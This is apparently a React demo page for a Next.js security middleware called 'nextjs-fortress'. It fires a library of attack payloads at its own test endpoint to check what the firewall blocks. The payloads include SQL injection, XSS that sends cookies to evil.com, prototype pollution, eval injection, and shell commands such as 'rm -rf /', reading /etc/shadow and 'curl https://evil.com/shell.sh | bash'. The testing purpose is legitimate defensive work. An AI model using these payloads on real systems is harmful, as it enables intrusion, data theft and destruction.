'use client'

import React, { useState } from 'react'
import {
  Shield,
  Bug,
  Lock,
  Zap,
  CheckCircle2,
  XCircle,
  Activity,
  Database,
  Code,
  FileWarning,
  Network,
} from 'lucide-react'

// --- TYPES ---
type AttackSeverity = 'critical' | 'high' | 'medium'
type AttackCategory = 'deserialization' | 'injection' | 'encoding' | 'general'

interface AttackPayload {
  [key: string]: any
}

interface Attack {
  name: string
  icon: React.ComponentType<{ className?: string }>
  description: string
  payload: AttackPayload
  severity: AttackSeverity
  category: AttackCategory
}

interface TestResult {
  blocked: boolean
  attack: string
  severity: AttackSeverity
  responseStatus: number
  message: string
  details: {
    rule: string
    pattern: string
    confidence: number
    action: string
    timestamp: string
  }
}

// --- ATTACK LIBRARY ---
const ATTACKS: Record<string, Attack> = {
  prototypePollution: {
    name: 'Prototype Pollution (CVE-2025-55182)',
    icon: Bug,
    description: 'Injects __proto__ to execute arbitrary code',
    payload: {
      __proto__: { isAdmin: true },
      constructor: { prototype: { hacked: true } },
    },
    severity: 'critical',
    category: 'deserialization',
  },

  constructorInjection: {
    name: 'Constructor Injection',
    icon: Bug,
    description: 'Hijacks object constructors for RCE',
    payload: {
      username: 'admin',
      constructor: {
        prototype: {
          toString: "function() { require('child_process').exec('whoami') }",
        },
      },
    },
    severity: 'critical',
    category: 'deserialization',
  },

  deepNesting: {
    name: 'Deep Nesting Bypass',
    icon: Activity,
    description: 'Deeply nested objects to exceed depth limits',
    payload: {
      level1: {
        level2: {
          level3: {
            level4: {
              level5: {
                level6: {
                  level7: {
                    level8: {
                      level9: {
                        level10: {
                          level11: { __proto__: { polluted: true } },
                        },
                      },
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
    severity: 'high',
    category: 'deserialization',
  },

  sqlUnion: {
    name: 'SQL Injection - UNION',
    icon: Database,
    description: 'UNION SELECT to extract sensitive data',
    payload: {
      username: "admin' UNION SELECT password FROM users--",
      query:
        'SELECT * FROM products WHERE id=1 UNION SELECT * FROM admin_users--',
    },
    severity: 'critical',
    category: 'injection',
  },

  sqlBoolean: {
    name: 'SQL Injection - Boolean',
    icon: Database,
    description: 'Boolean-based blind SQL injection',
    payload: {
      username: "admin' OR '1'='1",
      password: "anything' OR '1'='1'--",
    },
    severity: 'critical',
    category: 'injection',
  },

  sqlTimeBased: {
    name: 'SQL Injection - Time Based',
    icon: Database,
    description: 'Time-delay SQL injection',
    payload: {
      id: "1; WAITFOR DELAY '00:00:05'--",
      search: "test' AND SLEEP(5)--",
    },
    severity: 'high',
    category: 'injection',
  },

  xssScript: {
    name: 'XSS - Script Tag',
    icon: Zap,
    description: 'Direct JavaScript injection',
    payload: {
      comment: "<script>alert('XSS')</script>",
      bio: "<script>fetch('https://evil.com?c='+document.cookie)</script>",
    },
    severity: 'high',
    category: 'injection',
  },

  xssEventHandler: {
    name: 'XSS - Event Handler',
    icon: Zap,
    description: 'HTML event handler exploitation',
    payload: {
      name: '<img src=x onerror=alert(1)>',
      avatar: "<body onload=alert('XSS')>",
    },
    severity: 'high',
    category: 'injection',
  },

  xssIframe: {
    name: 'XSS - Iframe Injection',
    icon: Zap,
    description: 'Malicious iframe embedding',
    payload: {
      content: "<iframe src='https://evil.com/steal'></iframe>",
      description: "<iframe src='javascript:alert(document.cookie)'></iframe>",
    },
    severity: 'high',
    category: 'injection',
  },

  cmdShell: {
    name: 'Command Injection - Shell',
    icon: Lock,
    description: 'Shell command execution attempt',
    payload: {
      filename: '; cat /etc/passwd',
      path: '| whoami',
      command: '&& rm -rf /',
    },
    severity: 'critical',
    category: 'injection',
  },

  cmdBackticks: {
    name: 'Command Injection - Backticks',
    icon: Lock,
    description: 'Command substitution with backticks',
    payload: {
      file: '`cat /etc/shadow`',
      directory: '$(curl https://evil.com/shell.sh | bash)',
    },
    severity: 'critical',
    category: 'injection',
  },

  evalInjection: {
    name: 'Code Injection - eval()',
    icon: Code,
    description: 'JavaScript eval() exploitation',
    payload: {
      expression: 'eval(\'require("child_process").exec("whoami")\')',
      code: "Function('return process.env')()",
    },
    severity: 'critical',
    category: 'injection',
  },

  utf16leBypass: {
    name: 'Ghost Mode - UTF-16LE',
    icon: FileWarning,
    description: 'UTF-16LE encoding WAF bypass',
    payload: {
      malicious: '<script>alert(1)</script>',
      _encoding: 'utf-16le',
    },
    severity: 'critical',
    category: 'encoding',
  },

  rateLimitTest: {
    name: 'Rate Limit Stress Test',
    icon: Network,
    description: 'Rapid requests to trigger rate limiting',
    payload: {
      test: 'rate_limit_probe',
      timestamp: Date.now(),
    },
    severity: 'medium',
    category: 'general',
  },

  validRequest: {
    name: '✅ Valid Request',
    icon: CheckCircle2,
    description: 'Legitimate request (should pass)',
    payload: {
      username: 'john_doe',
      email: 'john@example.com',
      message: 'Normal data',
    },
    severity: 'medium',
    category: 'general',
  },
}

type AttackKey = keyof typeof ATTACKS

export default function FortressDemo() {
  const [selectedAttack, setSelectedAttack] =
    useState<AttackKey>('prototypePollution')
  const [testResult, setTestResult] = useState<TestResult | null>(null)
  const [loading, setLoading] = useState<boolean>(false)
  const [testHistory, setTestHistory] = useState<TestResult[]>([])
  const [selectedCategory, setSelectedCategory] = useState<string>('all')

  const simulateAttack = async (attackType: AttackKey): Promise<void> => {
    setLoading(true)
    setTestResult(null)

    try {
      const attack = ATTACKS[attackType]

      if (attackType === 'rateLimitTest') {
        await runRateLimitTest(attack)
        return
      }

      const headers: HeadersInit = { 'Content-Type': 'application/json' }
      if (attack.payload._encoding === 'utf-16le') {
        headers['Content-Type'] = 'application/json; charset=utf-16le'
      }

      const response = await fetch('/api/test', {
        method: 'POST',
        headers,
        body: JSON.stringify(attack.payload),
      })

      const result: TestResult = {
        blocked: response.status === 403 || response.status === 400,
        attack: attack.name,
        severity: attack.severity,
        responseStatus: response.status,
        message:
          response.status === 403 || response.status === 400
            ? `🛡️ Attack blocked by Fortress!`
            : response.status === 200
              ? `✅ Request allowed (Expected for valid)`
              : `⚠️ Unexpected: ${response.status}`,
        details: {
          rule: response.headers.get('x-fortress-rule') || 'none',
          pattern: JSON.stringify(attack.payload).substring(0, 50) + '...',
          confidence: parseFloat(
            response.headers.get('x-fortress-confidence') || '0'
          ),
          action: `${response.status === 403 ? 'Blocked' : 'Allowed'} (${response.status})`,
          timestamp: new Date().toLocaleTimeString(),
        },
      }

      setTestResult(result)
      setTestHistory((prev) => [result, ...prev.slice(0, 9)])
    } catch (error) {
      console.error('Test failed', error)
    } finally {
      setLoading(false)
    }
  }

  const runRateLimitTest = async (attack: Attack): Promise<void> => {
    const requests = 12
    let blockedCount = 0
    let allowedCount = 0

    for (let i = 0; i < requests; i++) {
      try {
        const response = await fetch('/api/test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ...attack.payload, requestNumber: i + 1 }),
        })

        if (response.status === 429) blockedCount++
        else if (response.status === 200) allowedCount++

        await new Promise((resolve) => setTimeout(resolve, 100))
      } catch (error) {
        console.error(`Request ${i + 1} failed:`, error)
      }
    }

    const result: TestResult = {
      blocked: blockedCount > 0,
      attack: attack.name,
      severity: attack.severity,
      responseStatus: blockedCount > 0 ? 429 : 200,
      message:
        blockedCount > 0
          ? `🛡️ Rate limit triggered! ${blockedCount}/${requests} blocked`
          : `⚠️ No rate limit (sent ${requests} requests)`,
      details: {
        rule: 'rate_limit',
        pattern: `${allowedCount} allowed, ${blockedCount} blocked`,
        confidence: blockedCount > 0 ? 1.0 : 0,
        action: `${requests} rapid requests`,
        timestamp: new Date().toLocaleTimeString(),
      },
    }

    setTestResult(result)
    setTestHistory((prev) => [result, ...prev.slice(0, 9)])
    setLoading(false)
  }

  const currentAttack = ATTACKS[selectedAttack]
  const CurrentIcon = currentAttack.icon

  const filteredAttacks = Object.entries(ATTACKS).filter(([_, attack]) => {
    if (selectedCategory === 'all') return true
    return attack.category === selectedCategory
  })

  const categories = [
    { id: 'all', name: 'All', icon: Shield },
    { id: 'deserialization', name: 'Deserialization', icon: Bug },
    { id: 'injection', name: 'Injection', icon: Database },
    { id: 'encoding', name: 'Encoding', icon: FileWarning },
    { id: 'general', name: 'General', icon: Activity },
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <div className="text-center mb-8">
          <div className="flex items-center justify-center gap-3 mb-4">
            <Shield className="w-10 h-10 md:w-12 md:h-12 text-blue-400" />
            <h1 className="text-4xl md:text-5xl font-bold text-white">
              nextjs-fortress
            </h1>
          </div>
          <p className="text-lg md:text-xl text-blue-200 mb-4">
            Security Validation Framework
          </p>
          <div className="inline-flex items-center gap-2 px-4 py-2 bg-blue-500/20 rounded-full border border-blue-400/30">
            <CheckCircle2 className="w-5 h-5 text-green-400" />
            <span className="text-green-300 font-medium">
              Active Protection
            </span>
          </div>

          <div className="flex flex-wrap justify-center gap-2 mt-6">
            {categories.map((cat) => {
              const Icon = cat.icon
              return (
                <button
                  key={cat.id}
                  onClick={() => setSelectedCategory(cat.id)}
                  className={`flex items-center gap-2 px-4 py-2 rounded-lg transition-all ${
                    selectedCategory === cat.id
                      ? 'bg-blue-500/30 border border-blue-400 text-white'
                      : 'bg-white/5 border border-white/10 text-gray-300 hover:bg-white/10'
                  }`}
                >
                  <Icon className="w-4 h-4" />
                  <span className="text-sm font-medium">{cat.name}</span>
                </button>
              )
            })}
          </div>
        </div>

        <div className="grid lg:grid-cols-2 gap-6">
          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20">
            <h2 className="text-xl font-bold text-white mb-6 flex items-center gap-2">
              <Bug className="w-6 h-6 text-red-400" />
              Threat Vectors ({filteredAttacks.length})
            </h2>

            <div className="space-y-2 max-h-[600px] overflow-y-auto pr-2">
              {filteredAttacks.map(([key, attack]) => {
                const AttackIcon = attack.icon
                const attackKey = key as AttackKey
                return (
                  <button
                    key={key}
                    onClick={() => setSelectedAttack(attackKey)}
                    className={`w-full text-left p-3 rounded-xl transition-all ${
                      selectedAttack === key
                        ? 'bg-blue-500/30 border-2 border-blue-400'
                        : 'bg-white/5 border-2 border-transparent hover:bg-white/10'
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <AttackIcon
                        className={`w-5 h-5 mt-1 ${
                          attack.severity === 'critical'
                            ? 'text-red-400'
                            : attack.severity === 'high'
                              ? 'text-orange-400'
                              : 'text-yellow-400'
                        }`}
                      />
                      <div className="flex-1">
                        <div className="flex items-center justify-between gap-2">
                          <h3 className="font-semibold text-white text-sm">
                            {attack.name}
                          </h3>
                          <span
                            className={`text-[9px] font-bold px-2 py-0.5 rounded-full ${
                              attack.severity === 'critical'
                                ? 'bg-red-500/20 text-red-300'
                                : attack.severity === 'high'
                                  ? 'bg-orange-500/20 text-orange-300'
                                  : 'bg-yellow-500/20 text-yellow-300'
                            }`}
                          >
                            {attack.severity.toUpperCase()}
                          </span>
                        </div>
                        <p className="text-xs text-gray-300 mt-1">
                          {attack.description}
                        </p>
                      </div>
                    </div>
                  </button>
                )
              })}
            </div>
          </div>

          <div className="space-y-6">
            <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20">
              <div className="flex items-center gap-3 mb-4">
                <CurrentIcon className="w-6 h-6 text-blue-400" />
                <h2 className="text-xl font-bold text-white">
                  Payload Inspection
                </h2>
              </div>

              <div className="bg-black/40 rounded-xl p-4 border border-white/10 overflow-x-auto">
                <pre className="text-xs text-red-300 font-mono">
                  {JSON.stringify(currentAttack.payload, null, 2)}
                </pre>
              </div>

              <button
                onClick={() => simulateAttack(selectedAttack)}
                disabled={loading}
                className="w-full mt-6 bg-gradient-to-r from-red-500 to-pink-600 hover:from-red-600 hover:to-pink-700 disabled:from-gray-700 disabled:to-gray-800 text-white font-bold py-4 rounded-xl transition-all"
              >
                {loading ? 'Testing...' : '🔥 Test Firewall Logic'}
              </button>
            </div>

            {testResult && (
              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20">
                <div className="flex items-center gap-3 mb-4">
                  {testResult.blocked ? (
                    <Shield className="w-6 h-6 text-green-400" />
                  ) : (
                    <XCircle className="w-6 h-6 text-red-400" />
                  )}
                  <h2 className="text-xl font-bold text-white">Result</h2>
                </div>

                <div
                  className={`border rounded-xl p-4 mb-4 ${
                    testResult.blocked
                      ? 'bg-green-500/10 border-green-500/30'
                      : 'bg-red-500/10 border-red-500/30'
                  }`}
                >
                  <span
                    className={`font-bold ${testResult.blocked ? 'text-green-400' : 'text-red-400'}`}
                  >
                    {testResult.message}
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-3 text-xs font-mono">
                  <div className="bg-black/30 p-3 rounded-lg">
                    <span className="text-gray-500 block mb-1 text-[10px]">
                      RULE
                    </span>
                    <span className="text-blue-300">
                      {testResult.details.rule}
                    </span>
                  </div>
                  <div className="bg-black/30 p-3 rounded-lg">
                    <span className="text-gray-500 block mb-1 text-[10px]">
                      STATUS
                    </span>
                    <span className="text-white">
                      {testResult.responseStatus}
                    </span>
                  </div>
                  <div className="bg-black/30 p-3 rounded-lg">
                    <span className="text-gray-500 block mb-1 text-[10px]">
                      CONFIDENCE
                    </span>
                    <span className="text-white">
                      {testResult.details.confidence * 100}%
                    </span>
                  </div>
                  <div className="bg-black/30 p-3 rounded-lg">
                    <span className="text-gray-500 block mb-1 text-[10px]">
                      TIME
                    </span>
                    <span className="text-white">
                      {testResult.details.timestamp}
                    </span>
                  </div>
                </div>
              </div>
            )}

            {testHistory.length > 0 && (
              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20">
                <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                  <Activity className="w-5 h-5 text-purple-400" />
                  History ({testHistory.length})
                </h3>
                <div className="space-y-2 max-h-64 overflow-y-auto">
                  {testHistory.map((result, idx) => (
                    <div
                      key={idx}
                      className="bg-black/20 rounded-lg p-3 text-xs"
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-white font-medium">
                          {result.attack}
                        </span>
                        {result.blocked ? (
                          <CheckCircle2 className="w-4 h-4 text-green-400" />
                        ) : (
                          <XCircle className="w-4 h-4 text-red-400" />
                        )}
                      </div>
                      <div className="flex justify-between text-gray-400">
                        <span>{result.details.timestamp}</span>
                        <span>{result.responseStatus}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>

        <footer className="mt-12 text-center text-slate-500 text-xs font-mono">
          <p>
            nextjs-fortress v0.1.0 •{' '}
            {testHistory.filter((t) => t.blocked).length}/{testHistory.length}{' '}
            blocked
          </p>
        </footer>
      </div>
    </div>
  )
}
